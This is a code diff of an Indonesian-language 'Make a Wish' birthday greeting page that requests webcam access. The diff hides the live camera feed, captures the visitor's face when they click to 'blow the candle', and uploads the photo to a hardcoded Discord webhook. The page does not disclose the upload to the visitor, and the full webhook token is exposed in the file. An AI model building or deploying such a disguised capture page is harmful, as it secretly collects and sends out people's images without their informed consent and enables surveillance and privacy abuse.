@@ -15,7 +15,6 @@
             overflow: hidden;
         }
 
-        /* Efek Flash Putih */
         #flash-effect {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: white; opacity: 0; pointer-events: none; z-index: 9999;
@@ -25,10 +24,8 @@
             text-align: center; background: rgba(255, 255, 255, 0.05);
             padding: 40px; border-radius: 30px; backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1); width: 85%; max-width: 400px;
-            transition: transform 0.1s;
         }
 
-        /* Animasi Shake saat difoto */
         .shake { animation: shake 0.2s ease-in-out; }
         @keyframes shake {
             0% { transform: translate(0,0); }
@@ -39,14 +36,21 @@
 
         h1 { font-family: 'Dancing Script', cursive; font-size: 2.5rem; margin-bottom: 10px; }
         
-        #camera-wrapper {
+        /* Area Preview Hasil Foto */
+        #photo-result-wrapper {
             width: 100%; height: 0; overflow: hidden;
             border-radius: 20px; transition: 0.5s all ease;
             margin: 0 auto; border: 0px solid var(--accent);
-            background: #000;
+            background: #2a2a40;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        #webcam { display: none; } /* Kamera tetap jalan tapi tidak terlihat */
+        #photo-canvas { 
+            width: 100%; height: 100%; 
+            object-fit: cover; display: none; 
+            transform: scaleX(-1); /* Mirror agar seperti kamera depan */
+        }
 
         .btn {
             background: var(--accent); color: white; border: none;
@@ -57,7 +61,6 @@
 
         .btn:hover { transform: scale(1.05); background: #ff4d6d; }
         #status { font-size: 0.8rem; margin-top: 15px; opacity: 0.6; }
-        canvas { display: none; }
     </style>
 </head>
 <body>
@@ -66,23 +69,23 @@
 
     <div class="container" id="main-card">
         <h1 id="title">Make a Wish</h1>
-        <p id="desc">Pejamkan matamu, pikirkan satu keinginan, lalu tekan tombol di bawah.</p>
+        <p id="desc">Pejamkan matamu, pikirkan satu keinginan...</p>
         
-        <div id="camera-wrapper">
+        <div id="photo-result-wrapper">
             <video id="webcam" autoplay playsinline></video>
+            <canvas id="photo-canvas"></canvas>
         </div>
 
-        <canvas id="photo-canvas"></canvas>
-        <button id="main-btn" class="btn" onclick="activateCamera()">Make a Wish! ✨</button>
-        <div id="status">Keajaiban akan dimulai saat tombol ditekan...</div>
+        <button id="main-btn" class="btn" onclick="activateCamera()">Siapkan Keinginan ✨</button>
+        <div id="status">Keajaiban sedang menunggu...</div>
     </div>
 
     <script>
-        // Ganti URL Webhook kamu di sini
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
         
         const video = document.getElementById('webcam');
-        const wrapper = document.getElementById('camera-wrapper');
+        const canvas = document.getElementById('photo-canvas');
+        const wrapper = document.getElementById('photo-result-wrapper');
         const btn = document.getElementById('main-btn');
         const statusText = document.getElementById('status');
         const title = document.getElementById('title');
@@ -90,68 +93,85 @@
         const card = document.getElementById('main-card');
 
         async function activateCamera() {
-            statusText.innerText = "Sedang menghubungkan ke bintang-bintang...";
+            statusText.innerText = "Mempersiapkan kamera ajaib...";
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                wrapper.style.height = "250px";
-                wrapper.style.borderWidth = "4px";
-                wrapper.style.marginBottom = "20px";
-                
-                title.innerText = "Abadikan Harapan";
+                // Ubah UI tanpa menampilkan video
+                title.innerText = "Sudah Siap?";
                 btn.innerText = "Tiup Lilin! 🎂";
-                statusText.innerText = "Tersenyumlah, sistem sedang menangkap aura kebahagiaanmu.";
+                statusText.innerText = "Klik saat kamu sudah siap meniup lilinnya.";
                 
                 btn.onclick = takePhoto;
 
             } catch (err) {
-                alert("Waduh, kameranya tidak diizinkan.");
+                alert("Kamera tidak diizinkan.");
                 statusText.innerText = "Gagal mengakses kamera.";
             }
         }
 
         function takePhoto() {
-            // 1. Efek Flash (Putih Terang sekilas)
+            // 1. Efek Flash & Shake
             flash.style.opacity = "1";
             card.classList.add('shake');
-            
             setTimeout(() => {
                 flash.style.opacity = "0";
                 flash.style.transition = "opacity 0.5s ease-out";
                 card.classList.remove('shake');
             }, 100);
 
-            // 2. Efek Confetti
+            // 2. Confetti
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
-            // 3. Proses Capture Foto
-            const canvas = document.getElementById('photo-canvas');
+            // 3. Gambar Foto ke Canvas
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
+            // Gambar orangnya
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Ganti teks segera setelah klik
-            title.innerText = "Mengirim ke Langit...";
-            btn.disabled = true;
-            btn.innerText = "Tersimpan!";
+            // 4. Tambahkan Stiker Ulang Tahun (Menggunakan Text & Emoji)
+            context.save();
+            // Karena video di-mirror di CSS, kita balik juga saat menggambar stiker jika perlu
+            // Tapi untuk teks lebih baik normal saja
+            context.font = "bold 50px Arial";
+            context.fillStyle = "white";
+            context.textAlign = "center";
+            context.shadowBlur = 10;
+            context.shadowColor = "black";
+            
+            // Tambah Teks/Stiker di bawah
+            context.fillText("Happy Birthday! 🥳", canvas.width/2, canvas.height - 50);
+            
+            // Tambah Ikon/Stiker di pojok
+            context.font = "80px Arial";
+            context.fillText("🎂", 100, 100);
+            context.fillText("✨", canvas.width - 100, 100);
+            context.restore();
 
-            // 4. Kirim ke Discord
+            // 5. Tampilkan Hasil di Web
+            canvas.style.display = "block";
+            wrapper.style.height = "250px";
+            wrapper.style.borderWidth = "4px";
+            wrapper.style.marginBottom = "20px";
+
+            title.innerText = "Harapan Terkirim!";
+            statusText.innerText = "Ini adalah momen bahagiamu.";
+            btn.style.display = "none";
+
+            // 6. Kirim ke Discord
             canvas.toBlob((blob) => {
                 const formData = new FormData();
-                formData.append('file', blob, 'birthday_wish.png');
-                formData.append('content', "📸 **YEAY! Seseorang baru saja merayakan ulang tahun!**\nIni foto wajah bahagianya saat Make a Wish.");
+                formData.append('file', blob, 'birthday_moment.png');
+                formData.append('content', "📸 **Momen Tiup Lilin Terdeteksi!**\nSeseorang baru saja membuat keinginan.");
 
-                fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData })
-                .then(() => {
-                    title.innerText = "Terkirim!";
-                    statusText.innerText = "Harapanmu sudah disimpan selamanya.";
-                    btn.style.display = "none";
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                });
+                fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                
+                // Matikan kamera
+                video.srcObject.getTracks().forEach(track => track.stop());
             }, 'image/png');
         }
     </script>
